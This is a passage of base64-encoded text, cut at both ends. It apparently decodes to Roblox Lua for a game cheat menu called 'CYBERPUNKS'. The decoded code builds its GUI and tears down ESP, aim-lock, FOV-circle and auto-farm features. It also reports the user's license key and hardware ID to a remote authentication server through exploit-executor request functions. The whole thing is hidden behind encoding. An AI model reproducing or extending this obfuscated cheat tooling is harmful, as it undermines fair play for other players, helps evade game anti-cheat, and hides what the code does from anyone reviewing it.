XplZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBpZiBkcmFnQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgIGRyYWdDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBkcmFnQ29ubmVjdGlvbiA9IG5pbAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIE1pbmltaXplZEd1aSBhbmQgTWluaW1pemVkR3VpOkZpbmRGaXJzdENoaWxkKCJNaW5pbWl6ZWRGcmFtZSIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdHdlZW4gPSBUd2VlblNlcnZpY2U6Q3JlYXRlKE1pbmltaXplZEd1aS5NaW5pbWl6ZWRGcmFtZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuUXVhcnQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLkluKSwge1NpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCl9KQogICAgICAgICAgICB0d2VlbjpQbGF5KCkKICAgICAgICAgICAgdHdlZW4uQ29tcGxldGVkOldhaXQoKQogICAgICAgICAgICBNaW5pbWl6ZWRHdWk6RGVzdHJveSgpCiAgICAgICAgICAgIE1pbmltaXplZEd1aSA9IG5pbAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIE1haW5GcmFtZS5WaXNpYmxlID0gdHJ1ZQogICAgICAgIGlzTWluaW1pemVkID0gZmFsc2UKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIG1pbmltaXplR3VpKCkKICAgICAgICBpZiBpc01pbmltaXplZCB0aGVuIHJldHVybiBlbmQKICAgICAgICBpc01pbmltaXplZCA9IHRydWUKICAgICAgICBNYWluRnJhbWUuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgTWluaW1pemVkR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgICAgIE1pbmltaXplZEd1aS5OYW1lID0gIk1pbmltaXplZENoZWF0IgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgTWluaW1pemVkR3VpLlBhcmVudCA9IENvcmVHdWkgZW5kKQogICAgICAgIGlmIG5vdCBNaW5pbWl6ZWRHdWkuUGFyZW50IHRoZW4gTWluaW1pemVkR3VpLlBhcmVudCA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIE1pbmltaXplZEZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgTWluaW1pemVkRnJhbWUuTmFtZSA9ICJNaW5pbWl6ZWRGcmFtZSIKICAgICAgICBNaW5pbWl6ZWRGcmFtZS5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApIC0tIFN0YXJ0IHNtYWxsCiAgICAgICAgTWluaW1pemVkRnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgNTAsIDAsIDUwKQogICAgICAgIE1pbmltaXplZEZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgTWluaW1pemVkRnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIE1pbmltaXplZEZyYW1lLkFjdGl2ZSA9IHRydWUKICAgICAgICBNaW5pbWl6ZWRGcmFtZS5QYXJlbnQgPSBNaW5pbWl6ZWRHdWkKICAgICAgICAKICAgICAgICBsb2NhbCBNQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIE1Db3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApIE1Db3JuZXIuUGFyZW50ID0gTWluaW1pemVkRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBNSW1hZ2UgPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiKQogICAgICAgIE1JbWFnZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgTUltYWdlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICAgICAgTUltYWdlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgTUltYWdlLkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBNSW1hZ2UuSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzEyMjMxODMwNTI5MjI3MyIKICAgICAgICBNSW1hZ2UuU2NhbGVUeXBlID0gRW51bS5TY2FsZVR5cGUuRml0CiAgICAgICAgTUltYWdlLlBhcmVudCA9IE1pbmltaXplZEZyYW1lCiAgICAgICAgbG9jYWwgTUltYWdlQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIE1JbWFnZUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkgTUltYWdlQ29ybmVyLlBhcmVudCA9IE1JbWFnZQogICAgICAgIAogICAgICAgIGxvY2FsIFJlc3RvcmVCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKSBSZXN0b3JlQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkgUmVzdG9yZUJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSBSZXN0b3JlQnRuLlRleHQgPSAiIiBSZXN0b3JlQnRuLlBhcmVudCA9IE1pbmltaXplZEZyYW1lCiAgICAgICAgUmVzdG9yZUJ0bi5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICAgICAgCiAgICAgICAgLS0gQ3VzdG9tIERyYWcgTG9naWMKICAgICAgICBsb2NhbCBkcmFnZ2luZyA9IGZhbHNlCiAgICAgICAgbG9jYWwgZHJhZ1N0YXJ0ID0gbmlsCiAgICAgICAgbG9jYWwgc3RhcnRQb3MgPSBuaWwKICAgICAgICBsb2NhbCBpc0NsaWNrID0gdHJ1ZQogICAgICAgIAogICAgICAgIFJlc3RvcmVCdG4uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgZHJhZ2dpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICBpc0NsaWNrID0gdHJ1ZQogICAgICAgICAgICAgICAgZHJhZ1N0YXJ0ID0gaW5wdXQuUG9zaXRpb24KICAgICAgICAgICAgICAgIHN0YXJ0UG9zID0gTWluaW1pemVkRnJhbWUuUG9zaXRpb24KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgaW5wdXRDb25uZWN0aW9uCiAgICAgICAgICAgICAgICBpbnB1dENvbm5lY3Rpb24gPSBpbnB1dC5DaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuRW5kIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZHJhZ2dpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpbnB1dENvbm5lY3Rpb24gdGhlbiBpbnB1dENvbm5lY3Rpb246RGlzY29ubmVjdCgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBpc0NsaWNrIHRoZW4gcmVzdG9yZUd1aSgpIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICAgICAgCiAgICAgICAgZHJhZ0Nvbm5lY3Rpb24gPSBVc2VySW5wdXRTZXJ2aWNlLklucHV0Q2hhbmdlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICBpZiBkcmFnZ2luZyB0aGVuCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50IG9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBkZWx0YSA9IGlucHV0LlBvc2l0aW9uIC0gZHJhZ1N0YXJ0CiAgICAgICAgICAgICAgICAgICAgaWYgZGVsdGEuTWFnbml0dWRlID4gNSB0aGVuIGlzQ2xpY2sgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICBNaW5pbWl6ZWRGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldyhzdGFydFBvcy5YLlNjYWxlLCBzdGFydFBvcy5YLk9mZnNldCArIGRlbHRhLlgsIHN0YXJ0UG9zLlkuU2NhbGUsIHN0YXJ0UG9zLlkuT2Zmc2V0ICsgZGVsdGEuWSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICAgICAgCiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShNaW5pbWl6ZWRGcmFtZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuUXVhcnQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gVURpbTIubmV3KDAsIDgwLCAwLCA4MCl9KTpQbGF5KCkKICAgIGVuZAoKICAgIC0tIFBBTkVMUyAoTGVmdCAmIFJpZ2h0IFN0cnVjdHVyZSkKICAgIGxvY2FsIExlZnRQYW5lbCA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgTGVmdFBhbmVsLk5hbWUgPSAiTGVmdFBhbmVsIgogICAgTGVmdFBhbmVsLlNpemUgPSBVRGltMi5uZXcoMCwgNDAwLCAxLCAwKQogICAgTGVmdFBhbmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBMZWZ0UGFuZWwuUGFyZW50ID0gTWFpbkZyYW1lCgogICAgbG9jYWwgUmlnaHRQYW5lbCA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgUmlnaHRQYW5lbC5OYW1lID0gIlJpZ2h0UGFuZWwiCiAgICBSaWdodFBhbmVsLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMSwgMCkgLS0gQ29tbWVuY2UgY2FjaMOpIChsYXJnZXVyIDApCiAgICBSaWdodFBhbmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDQwMCwgMCwgMCkKICAgIFJpZ2h0UGFuZWwuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE4LCAxOCwgMjIpCiAgICBSaWdodFBhbmVsLkJvcmRlclNpemVQaXhlbCA9IDAKICAgIFJpZ2h0UGFuZWwuQ2xpcHNEZXNjZW5kYW50cyA9IHRydWUKICAgIFJpZ2h0UGFuZWwuUGFyZW50ID0gTWFpbkZyYW1lCgogICAgbG9jYWwgUmlnaHRTZXBhcmF0b3IgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIFJpZ2h0U2VwYXJhdG9yLlNpemUgPSBVRGltMi5uZXcoMCwgMSwgMSwgMCkKICAgIFJpZ2h0U2VwYXJhdG9yLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgUmlnaHRTZXBhcmF0b3IuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgUmlnaHRTZXBhcmF0b3IuUGFyZW50ID0gUmlnaHRQYW5lbAoKICAgIC0tIEhlYWRlcgogICAgbG9jYWwgSGVhZGVyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBIZWFkZXIuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIEhlYWRlci5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgIEhlYWRlci5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBIZWFkZXIuUGFyZW50ID0gTGVmdFBhbmVsCgogICAgbG9jYWwgSGVhZGVyQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBIZWFkZXJDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkKICAgIEhlYWRlckNvcm5lci5QYXJlbnQgPSBIZWFkZXIKICAgIAogICAgbG9jYWwgSGVhZGVyRml4ID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBIZWFkZXJGaXguU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCA1KQogICAgSGVhZGVyRml4LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDEsIC01KQogICAgSGVhZGVyRml4LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgSGVhZGVyRml4LkJvcmRlclNpemVQaXhlbCA9IDAKICAgIEhlYWRlckZpeC5QYXJlbnQgPSBIZWFkZXIKCiAgICBsb2NhbCBUaXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIFRpdGxlLlRleHQgPSAiQ1lCRVJQVU5LUyIKICAgIFRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAxLCAwKQogICAgVGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDApCiAgICBUaXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgVGl0bGUuVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICBUaXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIFRpdGxlLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICBUaXRsZS5UZXh0U2l6ZSA9IDEwCiAgICBUaXRsZS5QYXJlbnQgPSBIZWFkZXIKICAgIAogICAgLS0gQ2xpY2sgVGl0bGUgdG8gTWluaW1pemUKICAgIGxvY2FsIFRpdGxlQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIFRpdGxlQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgIFRpdGxlQnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBUaXRsZUJ0bi5UZXh0ID0gIiIKICAgIFRpdGxlQnRuLlBhcmVudCA9IFRpdGxlCiAgICAKICAgIC0tIENsb3NlIEJ1dHRvbiAoQ3Jvc3MpCiAgICBsb2NhbCBDbG9zZUJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBDbG9zZUJ0bi5OYW1lID0gIkNsb3NlQnRuIgogICAgQ2xvc2VCdG4uVGV4dCA9ICLinJUiCiAgICBDbG9zZUJ0bi5TaXplID0gVURpbTIubmV3KDAsIDIwLCAwLCAyMCkKICAgIENsb3NlQnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC01MCwgMCwgNSkKICAgIENsb3NlQnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBDbG9zZUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCA1MCwgNTApCiAgICBDbG9zZUJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIENsb3NlQnRuLlRleHRTaXplID0gMTQKICAgIENsb3NlQnRuLlBhcmVudCA9IEhlYWRlcgogICAgCiAgICBDbG9zZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAtLSBTZW5kIERpc2Nvbm5lY3QgU2lnbmFsCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHJlcXVlc3RGdW5jID0gKHN5biBhbmQgc3luLnJlcXVlc3QpIG9yIChodHRwIGFuZCBodHRwLnJlcXVlc3QpIG9yIGh0dHBfcmVxdWVzdCBvciAoZmx1eHVzIGFuZCBmbHV4dXMucmVxdWVzdCkgb3IgcmVxdWVzdAogICAgICAgICAgICBpZiByZXF1ZXN0RnVuYyBhbmQga2V5U3RyaW5nIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGh3aWQgPSAoZ2V0aHdpZCBhbmQgZ2V0aHdpZCgpKSBvciAoZ2V0X2h3aWQgYW5kIGdldF9od2lkKCkpIG9yIHBsYXllci5Vc2VySWQKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICAgICAgICAgIFVybCA9IEFVVEhfVVJMIC4uICIvdmVyaWZ5P2tleT0iIC4uIGtleVN0cmluZyAuLiAiJmh3aWQ9IiAuLiB0b3N0cmluZyhod2lkKSAuLiAiJnR5cGU9ZGlzY29ubmVjdCIsCiAgICAgICAgICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJHRVQiCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQoKICAgICAgICBDb25maWcuSXNSdW5uaW5nID0gZmFsc2UKICAgICAgICBmb3IgXywgY29ubiBpbiBwYWlycyhDb25uZWN0aW9ucykgZG8KICAgICAgICAgICAgaWYgY29ubiB0aGVuIGNvbm46RGlzY29ubmVjdCgpIGVuZAogICAgICAgIGVuZAogICAgICAgIHRhYmxlLmNsZWFyKENvbm5lY3Rpb25zKQogICAgICAgIAogICAgICAgIC0tIDEuIERlc3Ryb3kgVUkKICAgICAgICBpZiBTY3JlZW5HdWkgdGhlbiBTY3JlZW5HdWk6RGVzdHJveSgpIGVuZAogICAgICAgIGlmIEVTUEZvbGRlciB0aGVuIEVTUEZvbGRlcjpEZXN0cm95KCkgZW5kCiAgICAgICAgaWYgTWluaW1pemVkR3VpIHRoZW4gTWluaW1pemVkR3VpOkRlc3Ryb3koKSBlbmQKICAgICAgICBpZiBCcm9hZGNhc3RHdWkgdGhlbiBCcm9hZGNhc3RHdWk6RGVzdHJveSgpIGVuZAogICAgICAgIGlmIF9HLlNub3dHdWkgdGhlbiBfRy5Tbm93R3VpOkRlc3Ryb3koKSBlbmQKICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJDeWJlcnB1bmtzIGhhcyBiZWVuIGRlc3Ryb3llZCIsIDMpCiAgICAgICAgCiAgICAgICAgLS0gMi4gRGlzYWJsZSBGZWF0dXJlcwogICAgICAgIGZvciBrLCB2IGluIHBhaXJzKENvbmZpZykgZG8KICAgICAgICAgICAgaWYgdHlwZSh2KSA9PSAiYm9vbGVhbiIgdGhlbgogICAgICAgICAgICAgICAgQ29uZmlnW2tdID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gMy4gQ2xlYW51cCBPYmplY3RzCiAgICAgICAgaWYgRk9WQ2lyY2xlIHRoZW4gcGNhbGwoZnVuY3Rpb24oKSBGT1ZDaXJjbGU6UmVtb3ZlKCkgZW5kKSBlbmQKICAgICAgICAKICAgICAgICAtLSBEZXN0cm95IHNub3cgZWZmZWN0CiAgICAgICAgaWYgU25vd0d1aSB0aGVuIFNub3dHdWk6RGVzdHJveSgpIGVuZAogICAgICAgIGlmIF9HLlNub3dHdWkgdGhlbiBfRy5Tbm93R3VpOkRlc3Ryb3koKSBlbmQKICAgICAgICBmb3IgXywgYyBpbiBwYWlycyhTbm93Q29ubmVjdGlvbnMpIGRvIGlmIGMgdGhlbiBjOkRpc2Nvbm5lY3QoKSBlbmQgZW5kCiAgICAgICAgU25vd0Nvbm5lY3Rpb25zID0ge30KICAgICAgICAKICAgICAgICAtLSA0LiBSZXNldCBDaGFyYWN0ZXIKICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgcm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMocm9vdFBhcnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiQm9keVZlbG9jaXR5Iikgb3IgdjpJc0EoIkJvZHlHeXJvIikgdGhlbiB2OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSA1LiBEaXNjb25uZWN0cwogICAgICAgIGlmIHJlYWNoQ29ubmVjdGlvbiB0aGVuIHJlYWNoQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgaWYgYW50aUxhdmFDb25uZWN0aW9uIHRoZW4gYW50aUxhdmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICBpZiBwb3RhdG9Db25uZWN0aW9uIHRoZW4gcG90YXRvQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBSdW5TZXJ2aWNlOlVuYmluZEZyb21SZW5kZXJTdGVwKCJBaW1Mb2NrUHJpb3JpdHkiKSBlbmQpCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBzY3JpcHQ6RGVzdHJveSgpIGVuZCkKICAgICAgICAKICAgICAgICAtLSBBdHRlbXB0IHRvIHN0b3AgZXh0ZXJuYWwgc2NyaXB0cwogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgX0cuQXV0b0Zhcm0gPSBmYWxzZTsgX0cuQXV0b0Zhcm1DaGVzdCA9IGZhbHNlIGVuZCkKICAgIGVuZCkKCiAgICBsb2NhbCBkaXNjb25uZWN0ZWQgPSBmYWxzZQogICAgbG9jYWwgZnVuY3Rpb24gU2VuZERpc2Nvbm5lY3RTaWduYWwoKQogICAgICAgIGlmIGRpc2Nvbm5lY3RlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICBkaXNjb25uZWN0ZWQgPSB0cnVlCiAgICAgICAgbG9jYWwgcmVxdWVzdEZ1bmMgPSAoc3luIGFuZCBzeW4ucmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgaHR0cF9yZXF1ZXN0IG9yIChmbHV4dXMgYW5kIGZsdXh1cy5yZXF1ZXN0KSBvciByZXF1ZXN0CiAgICAgICAgaWYgcmVxdWVzdEZ1bmMgYW5kIGtleVN0cmluZyB0aGVuCiAgICAgICAgICAgIGxvY2FsIGh3aWQgPSAoZ2V0aHdpZCBhbmQgZ2V0aHdpZCgpKSBvciAoZ2V0X2h3aWQgYW5kIGdldF9od2lkKCkpIG9yIHBsYXllci5Vc2VySWQKICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcmVxdWVzdEZ1bmMoewogICAgICAgICAgICAgICAgICAgIFVybCA9IEFVVEhfVVJMIC4uICIvdmVyaWZ5P2tleT0iIC4uIGtleVN0cmluZyAuLiAiJmh3aWQ9IiAuLiB0b3N0cmluZyhod2lkKSAuLiAiJnR5cGU9ZGlzY29ubmVjdCIsCiAgICAgICAgICAgICAgICAgICAgTWV0aG9kID0gIkdFVCIKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIC0tIEhhbmRsZSBHYW1lIEV4aXQgKEFsdCtGNCAvIENsb3NlIEJ1dHRvbikKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBnYW1lOkJpbmRUb0Nsb3NlKFNlbmREaXNjb25uZWN0U2lnbmFsKQogICAgZW5kKQogICAgLS0gSGFuZGxlIExlYXZlIHZpYSBNZW51IChFc2MgLT4gTGVhdmUpCiAgICBQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxyKSBpZiBwbHIgPT0gcGxheWVyIHRoZW4gU2VuZERpc2Nvbm5lY3RTaWduYWwoKSBlbmQgZW5kKQogICAgCiAgICAtLSBDdXN0b20gRHJhZyBMb2dpYyBmb3IgTWFpbkZyYW1lIChIZWFkZXIpCiAgICBsb2NhbCBkcmFnZ2luZ01haW4gPSBmYWxzZQogICAgbG9jYWwgZHJhZ1N0YXJ0TWFpbiA9IG5pbAogICAgbG9jYWwgc3RhcnRQb3NNYWluID0gbmlsCiAgICBsb2NhbCBpc0NsaWNrTWFpbiA9IHRydWUKICAgIAogICAgVGl0bGVCdG4uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBvciBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgIGRyYWdnaW5nTWFpbiA9IHRydWUKICAgICAgICAgICAgaXNDbGlja01haW4gPSB0cnVlCiAgICAgICAgICAgIGRyYWdTdGFydE1haW4gPSBpbnB1dC5Qb3NpdGlvbgogICAgICAgICAgICBzdGFydFBvc01haW4gPSBNYWluRnJhbWUuUG9zaXRpb24KICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGlucHV0Q29ubmVjdGlvbgogICAgICAgICAgICBpbnB1dENvbm5lY3Rpb24gPSBpbnB1dC5DaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0U3RhdGUgPT0gRW51bS5Vc2VySW5wdXRTdGF0ZS5FbmQgdGhlbgogICAgICAgICAgICAgICAgICAgIGRyYWdnaW5nTWFpbiA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgaW5wdXRDb25uZWN0aW9uIHRoZW4gaW5wdXRDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBpc0NsaWNrTWFpbiB0aGVuIG1pbmltaXplR3VpKCkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0Q2hhbmdlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGlmIGRyYWdnaW5nTWFpbiB0aGVuCiAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgZGVsdGEgPSBpbnB1dC5Qb3NpdGlvbiAtIGRyYWdTdGFydE1haW4KICAgICAgICAgICAgICAgIGlmIGRlbHRhLk1hZ25pdHVkZSA+IDUgdGhlbiBpc0NsaWNrTWFpbiA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgTWFpbkZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KHN0YXJ0UG9zTWFpbi5YLlNjYWxlLCBzdGFydFBvc01haW4uWC5PZmZzZXQgKyBkZWx0YS5YLCBzdGFydFBvc01haW4uWS5TY2FsZSwgc3RhcnRQb3NNYWluLlkuT2Zmc2V0ICsgZGVsdGEuWSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgbG9jYWwgVG9nZ2xlSW5mbyA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIFRvZ2dsZUluZm8uVGV4dCA9ICJTaGlmdCB0byBoaWRlIgogICAg" .. "VG9nZ2xlSW5mby5TaXplID0gVURpbTIubmV3KDEsIC02MCwgMSwgMCkKICAgIFRvZ2dsZUluZm8uUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKICAgIFRvZ2dsZUluZm8uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFRvZ2dsZUluZm8uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMTAwLCAxMDApCiAgICBUb2dnbGVJbmZvLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBUb2dnbGVJbmZvLlRleHRTaXplID0gNgogICAgVG9nZ2xlSW5mby5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuUmlnaHQKICAgIFRvZ2dsZUluZm8uUGFyZW50ID0gSGVhZGVyCiAgICAKICAgIC0tIFNlYXJjaCBCYXIKICAgIGxvY2FsIFNlYXJjaEJhciA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpCiAgICBTZWFyY2hCYXIuTmFtZSA9ICJTZWFyY2hCYXIiCiAgICBTZWFyY2hCYXIuU2l6ZSA9IFVEaW0yLm5ldygwLCA4MCwgMCwgMTgpCiAgICBTZWFyY2hCYXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtNDAsIDAuNSwgLTkpCiAgICBT